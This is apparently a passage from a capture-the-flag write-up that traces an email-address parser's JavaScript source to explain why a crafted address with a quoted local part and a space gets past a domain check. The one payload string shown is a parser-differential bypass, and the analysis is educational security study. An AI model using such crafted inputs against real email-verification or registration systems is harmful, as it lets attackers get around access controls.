        // If no address was found, try to detect one from regular text
        if (!data.address.length && data.text.length) {
            for (i = data.text.length - 1; i >= 0; i--) {
                if (data.text[i].match(/^[^@\s]+@[^@\s]+$/)) {
                    data.address = data.text.splice(i, 1);
                    break;
                }
            }

            let _regexHandler = function (address) {
                if (!data.address.length) {
                    data.address = [address.trim()];
                    return ' ';
                } else {
                    return address;
                }
            };

            // still no address
            if (!data.address.length) {
                for (i = data.text.length - 1; i >= 0; i--) {
                    // fixed the regex to parse email address correctly when email address has more than one @
                    data.text[i] = data.text[i].replace(/\s*\b[^@\s]+@[^\s]+\b\s*/, _regexHandler).trim();
                    if (data.address.length) {
                        break;
                    }
                }
            }
        }

        // If there's still is no text but a comment exixts, replace the two
        if (!data.text.length && data.comment.length) {
            data.text = data.comment;
            data.comment = [];
        }

        // Keep only the first address occurence, push others to regular text
        if (data.address.length > 1) {
            data.text = data.text.concat(data.address.splice(1));
        }

        // Join values with spaces
        data.text = data.text.join(' ');
        data.address = data.address.join(' ');

        if (!data.address && isGroup) {
            return [];
        } else {
            address = {
                address: data.address || data.text || '',
                name: data.text || data.address || ''
            };

            if (address.address === address.name) {
                if ((address.address || '').match(/@/)) {
                    address.name = '';
                } else {
                    address.address = '';
                }
            }

            addresses.push(address);
        }
    }

    return addresses;
}
```
- I will explain this : 
STEP 1: It create a data object to store all infomations we have.
```javascript
     let data = {
        address: [],
        comment: [],
        group: [],
        text: []
    };
```
Step2 : Read the token and read the type of it to set the stage and decide where the following data pushed into the data list.
```javascript
   for (i = 0, len = tokens.length; i < len; i++) {
        let token = tokens[i];
        let prevToken = i ? tokens[i - 1] : null;
        if (token.type === 'operator') {
            switch (token.value) {
                case '<':
                    state = 'address';
                    break;
                case '(':
                    state = 'comment';
                    break;
                case ':':
                    state = 'group';
                    isGroup = true;
                    break;
                default:
                    state = 'text';
                    break;
            }
```
You can see it just check the "<" at first to decide which one is address so our data wont be caught here!.
Then is some uninteresting features. Until this : 
```javascript
   // If no address was found, try to detect one from regular text
        //  This will run because we  dont use < > format
        if (!data.address.length && data.text.length) {
            for (i = data.text.length - 1; i >= 0; i--) {
                if (data.text[i].match(/^[^@\s]+@[^@\s]+$/)) {
                    data.address = data.text.splice(i, 1);
                    break;
                }
            }

            let _regexHandler = function (address) {
                if (!data.address.length) {
                    data.address = [address.trim()];
                    return ' ';
                } else {
                    return address;
                }
            };
            // still no address
            // Here we step into this 
            if (!data.address.length) {
                for (i = data.text.length - 1; i >= 0; i--) {
                    // fixed the regex to parse email address correctly when email address has more than one @
                    data.text[i] = data.text[i].replace(/\s*\b[^@\s]+@[^\s]+\b\s*/, _regexHandler).trim();
                    if (data.address.length) {
                        break;
                    }
                }
            }
```
- Author comments make me know what to do here. If there isn't the address parsed, It will use regrex to find our email. 
- First regrex is : 
```javascript
  for (i = data.text.length - 1; i >= 0; i--) {
                if (data.text[i].match(/^[^@\s]+@[^@\s]+$/)) {
                    data.address = data.text.splice(i, 1);
                    break;
                }
            }

```
- Then test it : ![image](https://hackmd.io/_uploads/rkWcS8YS1l.png)
- You can see that it just read the first pattern match email. This is the reason why our payload works !!!!
- The last try will check the final regrex is : 
```javascript
data.text[i] = data.text[i].replace(/\s*\b[^@\s]+@[^\s]+\b\s*/, _regexHandler).trim();
```
It will find the pattern and call the callback which will push that pattern into the address !!!!
# LET'S ANSWER THE QUESTIONS
The difference between  ? 
```javascript
email :' "test@email.htb" @interstellar.htb'
```
But this wont work ( JUST A SPACE )
```javascript
email :' "test@email.htb"@interstellar.htb'
```
When tokenized it will be something different  :  
![image](https://hackmd.io/_uploads/BJLT8UKBkl.png)

![image](https://hackmd.io/_uploads/HygpL8KrJx.png)

You see it right ? The noBreak makes the second one cannot work. It will be set by this logic : 
```javascript
 if (nextChr && ![' ', '\t', '\r', '\n', ',', ';'].includes(nextChr)) {
                this.node.noBreak = true;
            }
```
- When noBreak is enabled, it wont push our text token into array, but it will ***JOIN*** with the previous value.
```javascript
   if (prevToken && prevToken.noBreak && data[state].length) {
                // join values
                data[state][data[state].length - 1] += token.value;
            } else {
                data[state].push(token.value);
            }
```
And leads to the wrong email detected !!
![image](https://hackmd.io/_uploads/Sk-tDLYH1x.png)

# Conclusion 
- I learned alot from this challenge, and read this makes me can understand more how the payloads created. :vvv